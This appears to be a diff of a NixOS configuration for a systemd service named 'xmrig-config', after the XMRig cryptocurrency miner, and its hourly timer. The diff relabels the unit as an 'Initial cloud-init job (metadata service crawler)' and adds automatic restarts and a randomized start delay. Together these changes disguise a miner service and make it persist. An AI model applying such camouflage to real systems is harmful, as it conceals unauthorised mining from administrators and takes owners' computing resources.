@@ -53,13 +53,20 @@ in
   };
 
   systemd.services.xmrig-config = {
-    description = "Fetch a text file from a URL";
+    description = "Initial cloud-init job (metadata service crawler)";
     # requires = [ "network-online.target" ];
     # after = [ "network-online.target" ];
     wantedBy = [ "multi-user.target" ];
 
+    unitConfig = {
+      StartLimitIntervalSec = 60; # Time window for counting failures
+      StartLimitBurst = 3; # Maximum restart attempts in the above time
+    };
+
     serviceConfig = {
       Type = "oneshot";
+      Restart = "on-failure";
+      RestartSec = 10;
     };
 
     path = [
@@ -89,6 +96,7 @@ in
     timerConfig = {
       OnBootSec = "30";
       OnCalendar = "hourly";
+      RandomizedDelaySec = "1800";
       Persistent = true;
     };
   };
